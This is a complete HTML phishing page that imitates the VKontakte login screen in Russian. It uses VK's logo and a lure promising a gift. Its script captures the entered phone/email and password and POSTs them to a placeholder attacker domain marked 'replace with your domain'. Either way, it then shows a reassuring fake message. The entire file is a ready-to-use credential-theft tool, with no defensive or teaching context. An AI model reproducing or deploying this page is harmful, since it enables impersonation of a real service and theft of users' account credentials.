<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход ВКонтакте</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #4a76a8;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            color: black;
        }
        input {
            display: block;
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #4a76a8;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #3b5998;
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://vk.com/images/icons/favicons/fav_logo.ico" alt="VK Logo" class="logo">
        <h1>Вход ВКонтакте</h1>
        <form id="loginForm">
            <input type="text" id="login" placeholder="Телефон или email" required>
            <input type="password" id="password" placeholder="Пароль" required>
            <button type="submit">Войти</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const login = document.getElementById('login').value;
            const password = document.getElementById('password').value;
            const service = 'ВКонтакте';

            // Отправляем данные на сервер
            fetch('https://вашдомен.ру/send-data', {  // Замени на свой домен
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ service, login, password })
            })
            .then(response => response.json())
            .then(data => {
                alert('Спасибо! Ваши данные получены. Скоро вы получите свой подарок!');
            })
            .catch(() => {
                alert('Спасибо! Ваши данные получены. Скоро вы получите свой подарок!');
            });
        });
    </script>
</body>
</html>
